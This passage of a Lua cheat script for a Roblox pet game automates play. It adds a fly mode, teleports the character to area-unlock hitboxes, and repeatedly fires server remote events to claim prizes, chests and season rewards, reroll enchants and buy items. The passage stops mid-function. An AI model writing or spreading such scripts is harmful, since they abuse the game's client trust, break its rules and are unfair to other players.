local autoHidingOverlayThread = nil -- Variable to store the auto hiding thread

local function toggleAutoHideOverlay()
    AutoHideOverlay_Toggle = not AutoHideOverlay_Toggle
    
    if AutoHideOverlay_Toggle then
        -- Start a new thread for continuous overlay checking
        autoHidingOverlayThread = spawn(function()
            while AutoHideOverlay_Toggle do
                -- Use pcall for error handling
                pcall(function()
                    -- Check if the overlay exists and is visible
                    local overlay = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui:FindFirstChild(""_overlay"")
                    local dailyRWD = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui:FindFirstChild(""DailyRewards"")
                    local PlyTime = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui:FindFirstChild(""Playtime"")
                    local Mstry = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui:FindFirstChild(""Mastery"")
                    local Qust = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui:FindFirstChild(""Quests"")
                    local Sesson = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui:FindFirstChild(""Season"")
                    local NotifGame = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui:FindFirstChild(""HUD"") and 
                                    game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui.HUD:FindFirstChild(""NotifyGame"")
                    local Prompts = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui:FindFirstChild(""Prompt"")
                    local WorldMp = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui:FindFirstChild(""WorldMap"")
                    local UpdateNews = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui:FindFirstChild(""_changelog"")

                    if WorldMp and WorldMp.Visible then
                        -- Set the overlay to not visible
                        WorldMp.Visible = false
                    end

                    if overlay and overlay.Visible then
                        -- Set the overlay to not visible
                        overlay.Visible = false
                    end

                    if dailyRWD and dailyRWD.Visible then
                        -- Set the overlay to not visible
                        dailyRWD.Visible = false
                    end

                    if PlyTime and PlyTime.Visible then
                        -- Set the overlay to not visible
                        PlyTime.Visible = false
                    end

                    if Mstry and Mstry.Visible then
                        -- Set the overlay to not visible
                        Mstry.Visible = false
                    end

                    if Qust and Qust.Visible then
                        -- Set the overlay to not visible
                        Qust.Visible = false
                    end

                    if Sesson and Sesson.Visible then
                        -- Set the overlay to not visible
                        Sesson.Visible = false
                    end

                    if NotifGame and NotifGame.Visible then
                        -- Set the overlay to not visible
                        NotifGame.Visible = false
                    end

                    if Prompts and Prompts.Visible then
                        -- Set the overlay to not visible
                        Prompts.Visible = false
                    end

                    if UpdateNews and UpdateNews.Visible then
                        -- Set the overlay to not visible
                        UpdateNews.Visible = false
                    end

                end)
                
                -- Wait before checking again
                task.wait(20) -- Check every 20 seconds
            end
        end)
    end
    
    return AutoHideOverlay_Toggle
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Fly ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local isFlyModeActive = false
local flyModeThread = nil

local function toggleFlyMode()
    isFlyModeActive = not isFlyModeActive
    
    if isFlyModeActive then
        flyModeThread = spawn(function()
            while isFlyModeActive do
                pcall(function()
                    local player = game:GetService(""Players"").LocalPlayer
                    local character = player.Character
                    if not character then return end
                    
                    local humanoid = character:FindFirstChild(""Humanoid"")
                    local rootPart = character:FindFirstChild(""HumanoidRootPart"")
                    if not humanoid or not rootPart then return end
                    
                    local camera = workspace.CurrentCamera
                    local UIS = game:GetService(""UserInputService"")
                    local flySpeed = humanoid.WalkSpeed * 0.9
                    
                    -- Check if Gyro exists in rootPart, create if not
                    local Gyro = rootPart:FindFirstChild(""Gyro"")
                    if not Gyro then
                        Gyro = Instance.new(""BodyGyro"")
                        Gyro.Name = ""Gyro""
                        Gyro.P = 9e4
                        Gyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
                        Gyro.Parent = rootPart
                    end
                    
                    -- Check if BodyVelocity exists in rootPart, create if not
                    local Velocity = rootPart:FindFirstChild(""BodyVelocity"")
                    if not Velocity then
                        Velocity = Instance.new(""BodyVelocity"")
                        Velocity.Name = ""BodyVelocity""
                        Velocity.MaxForce = Vector3.new(9e9, 9e9, 9e9)
                        Velocity.Velocity = Vector3.zero
                        Velocity.Parent = rootPart
                    end
                    
                    -- Set platform stand
                    humanoid.PlatformStand = true
                    
                    -- Update Gyro CFrame
                    Gyro.CFrame = CFrame.new(rootPart.Position, rootPart.Position + camera.CFrame.LookVector)
                    
                    -- Calculate movement direction based on key presses
                    local moveDir = Vector3.new(0,0,0)
                    if UIS:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + camera.CFrame.LookVector end
                    if UIS:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - camera.CFrame.LookVector end
                    if UIS:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - camera.CFrame.RightVector end
                    if UIS:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + camera.CFrame.RightVector end
                    if UIS:IsKeyDown(Enum.KeyCode.E) then moveDir = moveDir + Vector3.new(0,1,0) end
                    if UIS:IsKeyDown(Enum.KeyCode.Q) then moveDir = moveDir - Vector3.new(0,1,0) end
                    
                    -- Apply speed
                    if moveDir.Magnitude > 0 then moveDir = moveDir.Unit * flySpeed end
                    Velocity.Velocity = moveDir
                end)
                
                task.wait(0.1)
            end
        end)
    else
        -- Clean up when toggled off
        pcall(function()
            local player = game:GetService(""Players"").LocalPlayer
            local character = player.Character
            if character then
                local humanoid = character:FindFirstChild(""Humanoid"")
                local rootPart = character:FindFirstChild(""HumanoidRootPart"")
                
                if humanoid then humanoid.PlatformStand = false end
                
                if rootPart then
                    local Gyro = rootPart:FindFirstChild(""Gyro"")
                    local Velocity = rootPart:FindFirstChild(""BodyVelocity"")
                    
                    if Gyro then Gyro:Destroy() end
                    if Velocity then Velocity:Destroy() end
                end
            end
        end)
    end
    
    return isFlyModeActive
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Press B ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local isPressingB = false -- Flag to track if we're pressing B periodically
local pressingBThread = nil -- Variable to store the pressing B thread

-- Function to toggle periodic B key pressing
local function togglePeriodicB()
    isPressingB = not isPressingB
    
    if isPressingB then
        -- Start a new thread for periodic B key pressing
        pressingBThread = spawn(function()
            while isPressingB do
                -- Press B key
                VIM:SendKeyEvent(true, ""B"", false, game) -- Press B
                task.wait(0.01)
                VIM:SendKeyEvent(false, ""B"", false, game) -- Release B
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""BeginSeasonInfinite"")
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ChallengePassClaimAll"")
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ClaimCompetitivePrize"", 1, 1)
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ClaimCompetitivePrize"", 2, 1)
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ClaimCompetitivePrize"", 3, 1)
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ClaimCompetitivePrize"", 4, 2)
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ClaimCompetitivePrize"", 5, 1)
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ClaimCompetitivePrize"", 6, 1)
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ClaimCompetitivePrize"", 7, 2)
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ClaimCompetitivePrize"", 8, 2)
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ClaimCompetitivePrize"", 9, 1)
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ClaimCompetitivePrize"", 10, 1)
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ClaimCompetitivePrize"", 11, 1)
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ClaimChest"", ""Giant Chest"", true)
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ClaimChest"", ""Void Chest"", true)
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""UnlockHatchingZone"")
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ClaimSeason"")
                task.wait(1)   
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""DoggyJumpWin"", 1)
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""DoggyJumpWin"", 2)
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""DoggyJumpWin"", 3)
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ClaimChest"", ""Void Chest"")
                task.wait(1)
                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""ClaimChest"", ""Giant Chest"")
                task.wait(5)
                
                -- Wait for 1 minute before pressing again
                task.wait(180)
            end
        end)
    end
    
    return isPressingB
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Mastery Function ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local function SimulateMasteryBuffButtonClick()
    local BuffButton = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui.Mastery.Container.Left.ScrollingFrame.Buffs.Button
    BuffButton:SetAttribute(""Pressed"", true)
    task.wait(0.1)
    BuffButton:SetAttribute(""Pressed"", false)
end

local function SimulateMasteryPetButtonClick()
    local PetButton = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui.Mastery.Container.Left.ScrollingFrame.Pets.Button
    PetButton:SetAttribute(""Pressed"", true)
    task.wait(0.1)
    PetButton:SetAttribute(""Pressed"", false)
end

local function SimulateMasteryShopButtonClick()
    local ShopButton = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui.Mastery.Container.Left.ScrollingFrame.Shops.Button
    ShopButton:SetAttribute(""Pressed"", true)
    task.wait(0.1)
    ShopButton:SetAttribute(""Pressed"", false)
end

local function FindAvailableAndMastery()
    isAutoMastery = not isAutoMastery
    
    if isAutoMastery then
        autoMasteryThread = spawn(function()
            while isAutoMastery do
                -- Get current mastery levels from data
                local freshData = LocalDataService:Get()
                
                -- Handle different data structures for MasteryLevels
                local masteryLevels = {Pets = 0, Buffs = 0, Shops = 0}
                
                -- Check if MasteryLevels exists and is a table
                if freshData.MasteryLevels and type(freshData.MasteryLevels) == ""table"" then
                    -- Check if it's an object with properties
                    if freshData.MasteryLevels.Pets ~= nil then
                        -- It's an object, get values or default to 0
                        masteryLevels = {
                            Pets = freshData.MasteryLevels.Pets or 0,
                            Buffs = freshData.MasteryLevels.Buffs or 0,
                            Shops = freshData.MasteryLevels.Shops or 0
                        }
                    end
                end
                
                -- Update the mastery completion flags
                PetsMasteryCompleted = (masteryLevels.Pets or 0) >= Target_Pets_Mastery
                BuffsMasteryCompleted = (masteryLevels.Buffs or 0) >= Target_Buffs_Mastery
                ShopsMasteryCompleted = (masteryLevels.Shops or 0) >= Target_Shops_Mastery
                AllMasteryCompleted = PetsMasteryCompleted and BuffsMasteryCompleted and ShopsMasteryCompleted
                
                -- Determine which category to focus on based on priority using global target variables
                local upgradePets = not PetsMasteryCompleted
                local upgradeBuffs = PetsMasteryCompleted and not BuffsMasteryCompleted
                local upgradeShops = PetsMasteryCompleted and BuffsMasteryCompleted and not ShopsMasteryCompleted
                
                -- Function to attempt upgrades within a category
                local function attemptUpgradesInCategory()
                    -- Get the Mastery UI
                    local MasteryFrame = game:GetService(""Players"").LocalPlayer.PlayerGui.ScreenGui.Mastery
                    
                    if not (MasteryFrame and MasteryFrame.Container and 
                            MasteryFrame.Container.Right and 
                            MasteryFrame.Container.Right.ScrollingFrame) then
                        return false
                    end
                    
                    local ScrollingFrame = MasteryFrame.Container.Right.ScrollingFrame
                    local madeUpgrade = false
                    
                    -- Loop through all templates to find upgrades
                    for _, template in pairs(ScrollingFrame:GetChildren()) do
                        if template.Name == ""Template"" then
                            local Content = template:FindFirstChild(""Content"")
                            if Content then
                                local Purchase = Content:FindFirstChild(""Purchase"")
                                if Purchase then
                                    local Button = Purchase:FindFirstChild(""Button"")
                                    if Button then
                                        local Label = Button:FindFirstChild(""Label"")
                                        if Label and Label.Text then
                                            -- Check if it's free
                                            if Label.Text == ""FREE"" or Label.Text == ""0"" then
                                                -- Click the button
                                                Button:SetAttribute(""Pressed"", true)
                                                task.wait(0.1)
                                                Button:SetAttribute(""Pressed"", false)
                                                madeUpgrade = true
                                                task.wait(0.2)
                                                return true
                                            end
                                            
                                            -- Determine currency type
                                            local isCoinPrice = true  -- Default to Coin
                                            local isGemPrice = false
                                            
                                            -- Look for currency icon
                                            for _, child in pairs(Button:GetChildren()) do
                                                if child:IsA(""ImageLabel"") or child:IsA(""ImageButton"") then
                                                    if child.Image and child.Image:match(""122003296498191"") then
                                                        isCoinPrice = false
                                                        isGemPrice = true
                                                        break
                                                    elseif child.Image and child.Image:match(""121401017387099"") then
                                                        isCoinPrice = true
                                                        isGemPrice = false
                                                        break
                                                    end
                                                end
                                            end
                                            
                                            -- Get the price value
                                            local price = convertPriceToNumber(Label.Text)
                                            
                                            -- Check resources - using the existing functions
                                            local currentCoins = GetCurrentCoins()
                                            local currentGems = GetCurrentGems()
                                            
                                            local canAfford = false
                                            if isCoinPrice and currentCoins >= price then
                                                canAfford = true
                                            elseif isGemPrice and currentGems >= price then
                                                canAfford = true
                                            end
                                            
                                            -- If we can afford it, make the purchase
                                            if canAfford then
                                                Button:SetAttribute(""Pressed"", true)
                                                task.wait(0.1)
                                                Button:SetAttribute(""Pressed"", false)
                                                madeUpgrade = true
                                                task.wait(0.2)
                                                return true
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                    
                    return madeUpgrade
                end
                
                -- Process upgrades by priority:
                -- First focus on Pets until they reach target, then Buffs, then Shops
                if upgradePets then
                    SimulateMasteryPetButtonClick()
                    task.wait(0.5)
                    attemptUpgradesInCategory()
                elseif upgradeBuffs then
                    SimulateMasteryBuffButtonClick()
                    task.wait(0.5)
                    attemptUpgradesInCategory()
                elseif upgradeShops then
                    SimulateMasteryShopButtonClick()
                    task.wait(0.5)
                    attemptUpgradesInCategory()
                else
                    -- All target levels reached, check all categories for any additional upgrades
                    
                    -- Check Pets first
                    SimulateMasteryPetButtonClick()
                    task.wait(0.5)
                    local upgradedPets = attemptUpgradesInCategory()
                    
                    if not upgradedPets then
                        -- Then check Buffs
                        SimulateMasteryBuffButtonClick()
                        task.wait(0.5)
                        local upgradedBuffs = attemptUpgradesInCategory()
                        
                        if not upgradedBuffs then
                            -- Finally check Shops
                            SimulateMasteryShopButtonClick()
                            task.wait(0.5)
                            attemptUpgradesInCategory()
                        end
                    end
                end
                
                -- Wait before next check
                task.wait(10)
            end
        end)
    end
    
    return isAutoMastery
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Reroll Function ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local RerollEnchants_Toggle = false
local RerollThread = nil

local function hasAnyDesiredEnchant(pet)
    if not pet or not pet.Enchants then return false end
    for _, enchant in ipairs(pet.Enchants) do
        local requiredLevel = enchants[enchant.Id]
        if requiredLevel and enchant.Level >= requiredLevel then
            return true
        end
    end
    return false
end

local function RerollEnchants()
    RerollEnchants_Toggle = not RerollEnchants_Toggle
    
    if RerollEnchants_Toggle then
        -- Start a new thread for continuous enchant rerolling
        RerollThread = spawn(function()
            while RerollEnchants_Toggle do
                -- Get the current team, which will refresh every cycle
                local data = LocalDataService:Get()
                local currentTeam = data.Teams[1].Pets
                
                for _, uuid in ipairs(currentTeam) do
                    local pet = getPetById(data, uuid)

                    if pet and not hasAnyDesiredEnchant(pet) then
                        while RerollEnchants_Toggle do
                            Remote.Function:InvokeServer(""RerollEnchants"", uuid)
                            task.wait(0.2)

                            -- Refresh data after each reroll
                            local updatedData = LocalDataService:Get()
                            pet = getPetById(updatedData, uuid)

                            if hasAnyDesiredEnchant(pet) then
                                break
                            end
                        end
                    end
                end
                
                -- After checking all pets, wait before rechecking to catch any team changes
                task.wait(60)
            end
        end)
    end
    
    return RerollEnchants_Toggle
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Buy Gum and Flavors ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

-- Function to get the highest priced item from a config table
local function get_Highest_Priced_Item(config_table)
    local highest_price = 0
    local highest_item_name = nil
    
    for item_name, item_data in pairs(config_table) do
        if item_data.price > highest_price then
            highest_price = item_data.price
            highest_item_name = item_name
        end
    end
    
    return highest_item_name
end

-- Get the dynamic max items
local max_flavor_item = get_Highest_Priced_Item(flavorsConfig)
local max_gum_item = get_Highest_Priced_Item(gumConfig)

local function AutoBuyItems()
    -- Refresh the max items in case the configs changed
    max_flavor_item = get_Highest_Priced_Item(flavorsConfig)
    max_gum_item = get_Highest_Priced_Item(gumConfig)
    
    AutoBuy_Toggle = not AutoBuy_Toggle
    
    if AutoBuy_Toggle then
        Buy_Thread = spawn(function()
            -- First check if we already have max upgrades
            local freshData = LocalDataService:Get()
            
            -- Check for max flavor using dynamic highest item
            if freshData.Flavors and freshData.Flavors[max_flavor_item] then
                max_Flavor_Reached = true
            end
            
            -- Check for max gum using dynamic highest item
            if freshData.Gum and freshData.Gum[max_gum_item] then
                max_Gum_Reached = true
            end
            
            -- Set combined flag
            max_Upgrades_Reached = max_Flavor_Reached and max_Gum_Reached
            
            -- If both are already maxed, no need to continue
            if max_Upgrades_Reached then
                AutoBuy_Toggle = false
                return
            end
            
            while AutoBuy_Toggle do
                local freshData = LocalDataService:Get()
                
                -- Update max status flags with fresh data
                if freshData.Flavors and freshData.Flavors[max_flavor_item] then
                    max_Flavor_Reached = true
                end
                
                if freshData.Gum and freshData.Gum[max_gum_item] then
                    max_Gum_Reached = true
                end
                
                max_Upgrades_Reached = max_Flavor_Reached and max_Gum_Reached
                
                -- Check if all items are already purchased
                if max_Upgrades_Reached then
                    AutoBuy_Toggle = false
                    break
                end
                
                -- Sort flavors by price (lowest first) if we haven't reached max flavor
                if not max_Flavor_Reached then
                    local flavors_To_Buy = {}
                    
                    for flavorName, config in pairs(flavorsConfig) do
                        if not freshData.Flavors[flavorName] then
                            table.insert(flavors_To_Buy, {name = flavorName, config = config})
                        end
                    end
                    
                    table.sort(flavors_To_Buy, function(a, b)
                        if a.config.currency == b.config.currency then
                            return a.config.price < b.config.price
                        else
                            return a.config.currency == ""Coins"" -- Prioritize coins purchases
                        end
                    end)
                    
                    -- Try to buy flavors in order of price
                    for _, flavorInfo in ipairs(flavors_To_Buy) do
                        local flavorName = flavorInfo.name
                        local config = flavorInfo.config
                        
                        local can_Afford = false
                        if config.currency == ""Coins"" and GetCurrentCoins() >= config.price then
                            can_Afford = true
                        elseif config.currency == ""Gems"" and GetCurrentGems() >= config.price then
                            can_Afford = true
                        end
                        
                        if can_Afford then
                            -- Attempt to buy the flavor using correct remote
                            Remote.Event:FireServer(""GumShopPurchase"", flavorName)
                            
                            -- Wait a moment for purchase to process
                            task.wait(0.3)
                            
                            -- Refresh data to check if purchase was successful
                            freshData = LocalDataService:Get()
                            
                            -- Check if we've reached max flavor
                            if freshData.Flavors and freshData.Flavors[max_flavor_item] then
                                max_Flavor_Reached = true
                            end
                            
                            -- Small delay between purchases
                            task.wait(0.5)
                        end
                    end
                end
                
                -- Sort gums by price (lowest first) if we haven't reached max gum
                if not max_Gum_Reached then
                    local gums_To_Buy = {}
                    freshData = LocalDataService:Get() -- Refresh data again
                    
                    for gumName, config in pairs(gumConfig) do
                        if not freshData.Gum[gumName] then
                            table.insert(gums_To_Buy, {name = gumName, config = config})
                        end
                    end
                    
                    table.sort(gums_To_Buy, function(a, b)
                        if a.config.currency == b.config.currency then
                            return a.config.price < b.config.price
                        else
                            return a.config.currency == ""Coins"" -- Prioritize coins purchases
                        end
                    end)
                    
                    -- Try to buy gums in order of price
                    for _, gumInfo in ipairs(gums_To_Buy) do
                        local gumName = gumInfo.name
                        local config = gumInfo.config
                        
                        local can_Afford = false
                        if config.currency == ""Coins"" and GetCurrentCoins() >= config.price then
                            can_Afford = true
                        elseif config.currency == ""Gems"" and GetCurrentGems() >= config.price then
                            can_Afford = true
                        end
                        
                        if can_Afford then
                            -- Attempt to buy the gum using correct remote
                            Remote.Event:FireServer(""GumShopPurchase"", gumName)
                            
                            -- Wait a moment for purchase to process
                            task.wait(0.3)
                            
                            -- Refresh data to check if purchase was successful
                            freshData = LocalDataService:Get()
                            
                            -- Check if we've reached max gum
                            if freshData.Gum and freshData.Gum[max_gum_item] then
                                max_Gum_Reached = true
                            end
                            
                            -- Small delay between purchases
                            task.wait(0.5)
                        end
                    end
                end
                
                -- Update combined flag
                max_Upgrades_Reached = max_Flavor_Reached and max_Gum_Reached
                
                -- Wait before checking again
                task.wait(5)
            end
        end)
    end
    
    return AutoBuy_Toggle, max_Flavor_Reached, max_Gum_Reached, max_Upgrades_Reached
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Area Unlock Function ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local AreaUnlock_Toggle = false
local AreaThread = nil
local areasUnlocked = false

local function UnlockAreas()
    AreaUnlock_Toggle = not AreaUnlock_Toggle
    
    if AreaUnlock_Toggle then
        AreaThread = spawn(function()
            -- Get player and character
            local player = game:GetService(""Players"").LocalPlayer
            
            while AreaUnlock_Toggle do
                -- Check current unlocked status
                local freshData = LocalDataService:Get()
                local allAreasUnlocked = true
                local areasToTry = {}
                
                -- Check which areas still need to be unlocked
                for _, areaName in ipairs(AreaToUnlock) do
                    if type(freshData.AreasUnlocked) ~= ""table"" or not freshData.AreasUnlocked[areaName] then
                        allAreasUnlocked = false
                        table.insert(areasToTry, areaName)
                    end
                end
                
                -- If all areas are unlocked, turn off function and exit
                if allAreasUnlocked then
                    AreaUnlock_Toggle = false
                    areasUnlocked = true
                    break
                end
                
                -- Try to unlock each remaining area
                for _, areaName in ipairs(areasToTry) do
                    if not AreaUnlock_Toggle then break end
                    
                    -- Make sure character exists
                    local character = player.Character or player.CharacterAdded:Wait()
                    local humanoidRootPart = character:WaitForChild(""HumanoidRootPart"")
                    
                    -- Find the area in Worlds
                    local areaWithoutSpaces = areaName:gsub("" "", """")
                    local areaFolder = workspace.Worlds[""The Overworld""].Islands:FindFirstChild(areaName) or 
                                     workspace.Worlds[""The Overworld""].Islands:FindFirstChild(areaWithoutSpaces)
                    
                    if areaFolder then
                        -- Search for UnlockHitbox using GetDescendants
                        local unlockHitbox = nil
                        for _, descendant in ipairs(areaFolder:GetDescendants()) do
                            if descendant.Name == ""UnlockHitbox"" then
                                unlockHitbox = descendant
                                break
                            end
                        end
                        
                        if unlockHitbox then
                            -- Teleport to the UnlockHitbox
                            humanoidRootPart.CFrame = unlockHitbox.CFrame * CFrame.new(0, 15, 0)
                            
                            -- Wait a bit for the unlock to register
                            task.wait(0.1)
                            
                            -- Update data to check if area was unlocked
                            freshData = LocalDataService:Get()
                            
                            -- If area is now unlocked, we can move to the next one
                            if type(freshData.AreasUnlocked) == ""table"" and freshData.AreasUnlocked[areaName] then
                                -- Area successfully unlocked
                            end
                        end
                    end
                    
                    -- Wait between areas
                    task.wait(0.1)
                end
                
                -- Wait before checking again
                task.wait(0.5)
            end
        end)
    end
    
    return AreaUnlock_Toggle
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Mystery Boxes Function ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local AutoMysteryBoxes_Toggle = false -- Flag to track if we're automatically using mystery boxes
local autoMysteryBoxesThread = nil -- Variable to store the auto mystery boxes thread

-- Function to check and use Mystery Boxes with toggle functionality
local function toggleAutoMysteryBoxes()
    AutoMysteryBoxes_Toggle = not AutoMysteryBoxes_Toggle
    
    if AutoMysteryBoxes_Toggle then
        -- Start a new thread for continuous Mystery Box usage
        autoMysteryBoxesThread = spawn(function()
            while AutoMysteryBoxes_Toggle do
                -- Use pcall to safely check data
                pcall(function()
                    -- Get fresh data directly from the LocalDataService
                    local freshData = LocalDataService:Get()
                    
                    -- Check if the player has Mystery Boxes in their Powerups
                    local mysteryBoxCount = freshData.Powerups and freshData.Powerups[""Mystery Box""] or 0
                    
                    if mysteryBoxCount > 0 then
                        -- Use Mystery Box (10 at a time or all if less than 10)
                        local amountToUse = math.min(mysteryBoxCount, 10)
                        game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""UseGift"", ""Mystery Box"", amountToUse)
                        task.wait(1)
                        
                        -- Check for gifts and claim them using the remote event
                        while true do
                            -- Check if Gifts folder exists and has children
